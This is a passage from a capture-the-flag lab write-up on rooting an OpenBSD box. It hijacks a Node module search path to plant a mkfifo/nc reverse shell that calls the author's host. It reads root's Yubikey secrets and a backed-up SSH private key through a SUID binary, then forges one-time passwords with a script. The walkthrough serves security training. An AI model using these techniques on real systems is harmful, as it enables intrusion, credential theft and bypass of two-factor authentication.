-rw-r--r--  1 john  wheel  18411 Jul 19 20:44 /tmp/chatbot.log
crossfit2$ date
Mon Jul 19 20:44:55 BST 2021

```

I can try to run `statbot.js` myself, but it crashes:

```

crossfit2$ node statbot.js
internal/modules/cjs/loader.js:985
  throw err;
  ^

Error: Cannot find module 'ws'
Require stack:
- /opt/sysadmin/server/statbot/statbot.js
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:982:15)
    at Function.Module._load (internal/modules/cjs/loader.js:864:27)
    at Module.require (internal/modules/cjs/loader.js:1044:19)
    at require (internal/modules/cjs/helpers.js:77:18)
    at Object.<anonymous> (/opt/sysadmin/server/statbot/statbot.js:1:19)
    at Module._compile (internal/modules/cjs/loader.js:1158:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1178:10)
    at Module.load (internal/modules/cjs/loader.js:1002:32)
    at Function.Module._load (internal/modules/cjs/loader.js:901:14)
    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:74:12) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [ '/opt/sysadmin/server/statbot/statbot.js' ]
}

```

It’s failing to load the websockets module `ws`.

### Exploit Node Module Load

#### Background

There are three modules imported with the `require` statement in this script: `ws`, `fs`, and `log-to-file`. The [NodeJS docs](https://nodejs.org/docs/v0.4.2/api/modules.html#all_Together...) give an algorithm for where `node` looks to load a module. To simplify a bit, core modules (like `fs`) are loaded from the install. For modules like `ws` and `log-to-file`, there’s a search of the filesystem, starting in the current directory and stepping up looking for a directory named `node_modules`. If that isn’t found, then it checks the environment variable `NODE_PATH`, and tries to load from there.

Given that there’s no `node_modules` directory in `/opt`, the calling john script must have `NODE_PATH` set. In fact, there’s a `node_modules` directory in `/usr/local/lib` that contains both `ws` and `log-to-file`, so it’s a good guess that’s what the variable is set to:

```

crossfit2$ find / -name ws -type d 2>/dev/null
/usr/local/lib/node_modules/pm2/node_modules/@pm2/agent-node/node_modules/ws
/usr/local/lib/node_modules/pm2/node_modules/ws
/usr/local/lib/node_modules/ws
crossfit2$ find / -name log-to-file -type d 2>/dev/null
/usr/local/lib/node_modules/log-to-file

```

#### Strategy

The search order means that if I can create a `node_modules` directory in any folder between `/` and `/opt/sysadmin/server/statbot`, the bot will try to load my script in place of the legit library. I’ll have to work fast, as every few minutes there’s a cron that cleans up the `node_modules` directory.

### POC

To test, I’ll use the `child_process` module to run system commands. I’ll use a `ping` to start.

```

require('child_process').execSync('ping -c 1 10.10.14.13');

```

First I’ll create the directory, then put the module into it:

```

crossfit2$ mkdir -p /opt/sysadmin/node_modules/ws/
crossfit2$ echo "require('child_process').execSync('ping -c 1 10.10.14.13');" > /opt/sysadmin/node_modules/ws/index.js 

```

When I run the script, it still errors out, but this time failing to import `log-to-file`:

```

crossfit2$ node /opt/sysadmin/server/statbot/statbot.js
internal/modules/cjs/loader.js:985
  throw err;
  ^

Error: Cannot find module 'log-to-file'
Require stack:
- /opt/sysadmin/server/statbot/statbot.js
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:982:15)
    at Function.Module._load (internal/modules/cjs/loader.js:864:27)
    at Module.require (internal/modules/cjs/loader.js:1044:19)
    at require (internal/modules/cjs/helpers.js:77:18)
    at Object.<anonymous> (/opt/sysadmin/server/statbot/statbot.js:3:16)
    at Module._compile (internal/modules/cjs/loader.js:1158:30)
    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1178:10)
    at Module.load (internal/modules/cjs/loader.js:1002:32)
    at Function.Module._load (internal/modules/cjs/loader.js:901:14)
    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:74:12) {
  code: 'MODULE_NOT_FOUND',
  requireStack: [ '/opt/sysadmin/server/statbot/statbot.js' ]
}

```

There’s also an ICMP packet at `tcpdump`:

```

16:21:51.245776 IP 10.10.10.232 > 10.10.14.13: ICMP echo request, id 10214, seq 0, length 64
16:21:51.245814 IP 10.10.14.13 > 10.10.10.232: ICMP echo reply, id 10214, seq 0, length 64

```

More importantly, around the time the cron runs, there’s another packet (two shown a minute apart):

```

16:21:55.359840 IP 10.10.10.232 > 10.10.14.13: ICMP echo request, id 33195, seq 0, length 64
16:21:55.359881 IP 10.10.14.13 > 10.10.10.232: ICMP echo reply, id 33195, seq 0, length 64
16:22:55.098196 IP 10.10.10.232 > 10.10.14.13: ICMP echo request, id 57123, seq 0, length 64
16:22:55.098233 IP 10.10.14.13 > 10.10.10.232: ICMP echo reply, id 57123, seq 0, length 64

```

### Shell

The box is BSD, so the standard reverse shells may or may not work. `nc` is on the box, so I’ll replace the `ping` with a `mkfifo` reverse shell:

```

crossfit2$ mkdir -p /opt/sysadmin/node_modules/ws/
crossfit2$ echo "require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f');" > /opt/sysadmin/node_modules/ws/index.js

```

Once the minute rolls over, there’s a connect at my waiting `nc`:

```

oxdf@parrot$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.232] 2807
/bin/sh: No controlling tty (open /dev/tty: Device not configured)
/bin/sh: Can't find tty file descriptor
/bin/sh: warning: won't have full job control
crossfit2$ id
uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)

```

I’ll upgrade the shell:

```

crossfit2$ python3 -c 'import pty;pty.spawn("sh")'
crossfit2$ ^Z
[1]+  Stopped                 nc -lvnp 443
oxdf@parrot$ stty raw -echo; fg
nc -lvnp 443
            reset
reset: unknown terminal type network
Terminal type? screen
                                                                         
crossfit2$

```

## Shell as root

### Enumeration

#### log

There’s not much in john’s homedir other than the automation of the bot. But john does bring a group that the previous shell didn’t have access to before, `staff`:

```

crossfit2$ id
uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)

```

There’s only one file that’s owned by this group (at least that I can access):

```

crossfit2$ find / -group staff 2>/dev/null
/usr/local/bin/log

```

It’s a 64-bit ELF executable with the the SUID bit set, and owned by root:

```

crossfit2$ ls -l /usr/local/bin/log
-rwsr-s---  1 root  staff  9024 Jan  5  2021 /usr/local/bin/log
crossfit2$ file /usr/local/bin/log  
/usr/local/bin/log: ELF 64-bit LSB shared object, x86-64, version 1

```

Running it looks like it takes a log file to read:

```

crossfit2$ log
* LogReader v0.1

[*] Usage: log <log file to read>

```

It won’t read `/etc/passwd`:

```

crossfit2$ log /etc/passwd           
* LogReader v0.1

[-] Log file not found!

```

There’s only one log in `/var/logs` and I can’t read it:

```

crossfit2$ find /var/log -type f -ls
751812    4 -rw-------    1 root     wheel        1811 Jul 19 21:54 /var/log/php-fpm.log
crossfit2$ head /var/log/php-fpm.log
head: /var/log/php-fpm.log: Permission denied

```

But `log` can:

```

crossfit2$ log /var/log/php-fpm.log
* LogReader v0.1

[*] Log size: 1811

[10-Mar-2021 14:39:49] NOTICE: fpm is running, pid 21340
[10-Mar-2021 14:39:49] NOTICE: ready to handle connections
[10-Mar-2021 14:40:59] NOTICE: Terminating ...
[10-Mar-2021 14:40:59] NOTICE: exiting, bye-bye!
[18-Mar-2021 13:24:08] NOTICE: fpm is running, pid 59047
...[snip]...

```

Ghidra isn’t great with BSD binaries, but this one is actually not too bad to clean up. The syscalls are wrapped in little helper functions. So I’ll see something like:

```

FUN_00102030(lVar2,0,2);

```

When I click on the function, it returns decompiled code of:

```

void FUN_00102030(void)

{
  FUN_00101f20();
  do {
                    /* WARNING: Do nothing block with infinite loop */
  } while( true );
}

```

Obviously it’s not just an infinite loop. Looking at the disassembly, it’s moving `fseek` into R11:

![image-20210719201122539](https://0xdfimages.gitlab.io/img/image-20210719201122539.png)

This is just a call to `fseek`. I’ll rename all the function in `main` to match.

Once cleaned up, the code looks like:

```

int main(int argc,char **argv)

{
  int unveil_return;
  long fh;
  long file_len;
  undefined8 buffer;
  int return_val;
  
  puts("\n* LogReader v0.1\n");
  if (argc != 2) {
    printf("[*] Usage: %s <log file to read>\n",*argv);
    exit(0);
  }
  unveil_return = unveil("/var","r");
  if (unveil_return == 0) {
    fh = fopen(argv[1],"rb");
    if (fh == 0) {
      puts("[-] Log file not found!");
      return_val = 1;
    }
    else {
      fseek(fh,0,2);
      file_len = ftell(fh);
      printf("[*] Log size: %ld\n\n",file_len);
      rewind(fh);
      buffer = malloc(file_len);
      fh = fread(buffer,1,file_len,fh);
      if (fh == file_len) {
        fwrite(buffer,1,file_len,0x105108);
        fflush(0x105108);
        free(buffer);
        return_val = 0;
      }
      else {
        puts("[-] Error while retrieving contents");
        free(buffer);
        return_val = 1;
      }
    }
  }
  else {
    puts("[-] Internal error. Please contact an administrator!");
    return_val = 1;
  }
  return return_val;
}

```

`unveil` [limits visibility](https://man.openbsd.org/unveil.2) for the rest of the program to the path passed to it, in this case, read access to `/var`. Then it opens the passed in file, and if successful, prints the length and the values. There’s not much I can exploit here. I just get read access to anything in `/var`.

#### /var

`/var` has a bunch of stuff in it:

```

crossfit2$ ls /var
account  backups  cron     games    monit    quotas   spool    tmp      yp
audit    cache    db       log      mysql    redis    sysmerge unbound
authpf   crash    empty    mail     nsd      run      syspatch www

```

A bunch of these are potentially interesting but are either empty (`account`) or I can’t access to list (`audit`, `authpf`, `backups`, `cron/tabs`)

Looking at `db`, `yubikey` jumps out:

```

crossfit2$ ls db/                                                              
acpi                kvm_bsd.db          ns                  xkb
host.random         ldap                ntpd.drift          xmlcatalog
installed.SHA256    libc.tags           pkg                 yubikey
kernel.SHA256       locate.database     rpki-client

```

#### Yubikey

`yubikey` is a [two factor auth solution](https://www.yubico.com/) that relies on a hardware token that acts like a keyboard. [This page](https://www.straybits.org/post/2014/openbsd-yubikey/) lays out the files where the Yubikey key material is stored. I’ll want to find `user.uid` and `user.key` in `/var/db/yubikey`. There might be a `user.ctr` file as well. Since I can read as root in `/var`, I can check. I’ll start with the root user, and it works:

```

crossfit2$ log /var/db/yubikey/root.key                                        
* LogReader v0.1

[*] Log size: 33

6bf9a26475388ce998988b67eaa2ea87
crossfit2$ log /var/db/yubikey/root.uid 
* LogReader v0.1

[*] Log size: 13

a4ce1128bde4
crossfit2$ log /var/db/yubikey/root.ctr 
* LogReader v0.1

[*] Log size: 6

985089

```

The page also talks about making sure “yubikey” is part of the auth-defaults in `/etc/login.conf`. It isn’t in the default class, but rather the daemon class. The comments for this class say it applies to `/etc/rc` and root:

```

# Settings used by /etc/rc and root                                                                      
# This must be set properly for daemons started as root by inetd as well.                                
# Be sure to reset these values to system defaults in the default class!                                 
#                                               
daemon:\
        :ignorenologin:\
        :datasize=infinity:\
        :maxproc=infinity:\
        :openfiles-max=102400:\
        :openfiles-cur=102400:\
        :stacksize-cur=8M:\
        :auth-ssh=yubikey:\
        :auth-su=reject:\                           
        :tc=default: 

```

Not only does root require `yubikey` for SSH auth, but it is rejecting `su` auth all together.

#### SSH Config

I went through the steps here to generate tokens based on the Yubikey material above (details below), but when I try to connect over SSH, it immediately rejects because I’m not offering an SSH key:

```

oxdf@parrot$ ssh  root@10.10.10.232
root@10.10.10.232: Permission denied (publickey).

```

Looking at the SSH config:

```

crossfit2$ cat /etc/ssh/sshd_config                                            
...[snip]...
Match User root
        AuthenticationMethods publickey,password
Match User *,!root
        AuthenticationMethods password

```

The section of the [sshd\_config man](https://man.openbsd.org/sshd_config#AuthenticationMethods) page on the `AuthenticationMethod` keyword details that the comma separated values must each be completed to authenticate. So in this case, a user needs both the key-based and password-based auth to get in as the root user. Based on the config above, that password will be Yubikey generated. But I still need to find the key.

#### changelist

The [man page](https://man.openbsd.org/changelist.5) for `changelist` describes it nicely:

> The /etc/changelist file is a simple text file containing the names of files to be
> backed up and checked for modification by the system security script, [security(8)](https://man.openbsd.org/security.8).
> It is checked daily by the /etc/daily script. See [daily(8)](https://man.openbsd.org/daily.8) for further details.
>
> Each line of the file contains the name of a file, specified by its absolute pathname,
> one per line. By default, configuration files in /etc, /root, and /var are added during
> system install. Administrators may add additional files at their discretion. Shell
> globbing is supported in pathnames.
>
> Backup files are held in the directory /var/backups. A backup of the current version
> of a file is kept in this directory, marked “current”. When the file is altered, the old
> version is marked as “backup” and the new version becomes “current”.
>
> For example, the system shell database, /etc/shells, is held as
> /var/backups/etc\_shells.current. When this file is modified, it is renamed to
> /var/backups/etc\_shells.backup and the new version becomes
> /var/backups/etc\_shells.current. Thereafter, these files are rotated.

The file on CrossfitTwo has a bunch of stuff in `/etc`, and then at the bottom, stuff from `/root` and `/var`:

```

crossfit2$ cat /etc/changelist  
...[snip]...
/root/.Xdefaults
/root/.cshrc
/root/.login
/root/.profile
/root/.rhosts
/root/.shosts
/root/.ssh/authorized_keys
/root/.ssh/authorized_keys2
/root/.ssh/id_rsa
/var/cron/at.allow
/var/cron/at.deny
/var/cron/cron.allow
/var/cron/cron.deny
/var/cron/tabs/root
/var/db/unwind.key
+/var/nsd/etc/nsd.conf
/var/unbound/etc/unbound.conf
/var/yp/Makefile.main
/var/yp/Makefile.yp
/.cshrc
/.profile

```

The `/var/cron/tabs/root` file might be interesting, and I can pull it using the filename described above:

```

crossfit2$ log /var/backups/var_cron_tabs_root.current
* LogReader v0.1

[*] Log size: 720

# DO NOT EDIT THIS FILE - edit the master and reinstall.
# (/tmp/crontab.Zax0ddiCGO installed on Tue Feb  2 14:10:23 2021)
# (Cron version V5.0)
#
SHELL=/bin/sh
PATH=/bin:/sbin:/usr/bin:/usr/sbin
HOME=/var/log
#
#minute hour    mday    month   wday    [flags] command
#
# rotate log files every hour, if necessary
0       *       *       *       *       /usr/bin/newsyslog
# send log file notifications, if necessary
#1-59   *       *       *       *       /usr/bin/newsyslog -m
#
# do daily/weekly/monthly maintenance
30      1       *       *       *       /bin/sh /etc/daily
30      3       *       *       6       /bin/sh /etc/weekly
30      5       1       *       *       /bin/sh /etc/monthly
#~      *       *       *       *       /usr/libexec/spamd-setup

#~      *       *       *       *       -ns rpki-client -v && bgpctl reload
*/10    *       *       *       *       /usr/sbin/rcctl restart unbound
*/5     *       *       *       *       rm -rf /opt/sysadmin/node_modules

```

There’s the cleanup script for the `node_modules` step, as well as a restart of `unbound` even ten minutes. More interesting though is the root SSH key:

```

crossfit2$ log /var/backups/root_.ssh_id_rsa.current
* LogReader v0.1

[*] Log size: 2610
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA8kTcUuEP05YI+m24YdS3WLOuYAhGt9SywnPrBTcmT3t0iZFccrHc
...[snip]...
/K8k9yVXUuG8ivLI3ZTDD46thrjxnn9D47DqDLXxCR837fsifgjv5kQTGaHl0+MRa5GlRK
fg/OEuYUYu9LJ/cwAAABJyb290QGNyb3NzZml0Mi5odGIBAgMEBQYH
-----END OPENSSH PRIVATE KEY-----

```

### SSH Yubikey Login

#### Setup Yubico-c Tools

There are surprisingly few tools out there to generate a yubikey code from the key/uid/ctr information. Luckily, Yubico has [some tools](https://github.com/Yubico/yubico-c), even if they are a bit under-documented.

Before starting, I’ll need the package `asciidoc` (`apt install asciidoc`). Then I’ll run the following commands as documented on the [developers page](https://developers.yubico.com/yubico-c/).

```

apt install asciidoc
git clone https://github.com/Yubico/yubico-c.git
cd yubico-c
autoreconf --install
./configure
make check
sudo make install

```

After running those, I should be able to run tools including `ykparse`, `ykgenerate`, and `modhex`.

#### Generate Token

`ykgenerate` is used to generate a token from a handful of inputs:

```

oxdf@parrot$ ykgenerate -h
Usage: ykgenerate <aeskey> <yk_internalname> <yk_counter> <yk_low> <yk_high> <yk_use> [<yk_rnd>]
 AESKEY:                Hex encoded AES-key.
 YK_INTERNALNAME:       Hex encoded yk_internalname (48 bit).
 YK_COUNTER:            Hex encoded counter (16 bit).
 YK_LOW:                Hex encoded timestamp low (16 bit).
 YK_HIGH:               Hex encoded timestamp high (8bit).
 YK_USE:                Hex encoded use (8 bit).
 YK_RND:                Hex encoded random (16 but) (optional).

```

I’ve got most of this from CrossfitTwo:
- `AESKEY` is what’s in `root.key`
- `YK_INTERNALNAME` is the contents of `root.uid`
- There’s a counter held in `root.ctr`. I need to take the next value, convert it to three bytes of hex (six characters), and then the high four characters are `YK_COUNTER` and the low two characters are `YK_USE`. It’s important to note that after each successful auth, this value increments by one.

There is only `YK_LOW` and `YK_HIGH` remaining. These are timestamps, which, from all the testing I did on CrossfitTwo, don’t matter. I suspect they may in other environments, but I’ll just set them to hex 0s.

I wrote a script to track the variables. It takes an option argument for offset to the counter so that I don’t have to edit the script each time:

```

#!/bin/bash

if [ -z "$1" ]; then
  off=0
else
  off=$1
fi

key="6bf9a26475388ce998988b67eaa2ea87"  # from /var/db/yubikey/root.key
uid="a4ce1128bde4"                      # from /var/db/yubikey/root.uid
ctr="985090"                            # from /var/db/yubikey/root.ctr + 1
tslow="0000"                            # doesn't seem to matter from testing
tshigh="00"                             # doesn't seem to matter from testing

ctroff=$((ctr + off))
hexctr=$(printf '%06x' $ctroff)
ykcounter=$(echo $hexctr | cut -c-4)
ykuse=$(echo $hexctr | cut -c5-)

echo ykgenerate $key $uid $ykcounter $tslow $tshigh $ykuse
ykgenerate $key $uid $ykcounter $tslow $tshigh $ykuse

```

It also prints the command that it will run before running it for reference. It generates a token:

```

oxdf@parrot$ ./gen_yubi_token.sh
ykgenerate 6bf9a26475388ce998988b67eaa2ea87 a4ce1128bde4 0f08 0000 00 01
dcnllhgdiubnntfrkugjjjttukcvdijn

```

`ykparse` will take that token and the API key and show what it break down to:

```

oxdf@parrot$ ykparse 6bf9a26475388ce998988b67eaa2ea87 dcnllhgdiubnntfrkugjjjttukcvdijn
Input:
  token: dcnllhgdiubnntfrkugjjjttukcvdijn
          20 ba a6 52 7e 1b bd 4c 9e 58 88 dd e9 0f 27 8b 
  aeskey: 6bf9a26475388ce998988b67eaa2ea87
          6b f9 a2 64 75 38 8c e9 98 98 8b 67 ea a2 ea 87 
Output:
          a4 ce 11 28 bd e4 08 0f 00 00 00 02 8f b2 ec f9 

Struct:
  uid: a4 ce 11 28 bd e4 
  counter: 3848 (0x0f08)
  timestamp (low): 0 (0x0000)
  timestamp (high): 0 (0x00)
  session use: 2 (0x02)
  random: 45711 (0xb28f)
  crc: 63980 (0xf9ec)

Derived:
  cleaned counter: 3848 (0x0f08)
  modhex uid: lfrubbdjntuf
  triggered by caps lock: no
  crc: F0B8
  crc check: ok

```

The `uid` matches. 0xf0802 == 985090, which is one more than the counter found on the box.

#### Shell

As I showed earlier, connecting without a key fails. With the key, it prompts for a password:

```

oxdf@parrot$ ssh -i ~/keys/crossfittwo-root-need-yubikey-as-well root@10.10.10.232
root@10.10.10.232's password:

```

Pasting in the yubikey output returns a shell:

```

...[snip]...
crossfit2#

```

And I can grab `root.txt`:

```

crossfit2# cat root.txt
6fbc09c1************************

```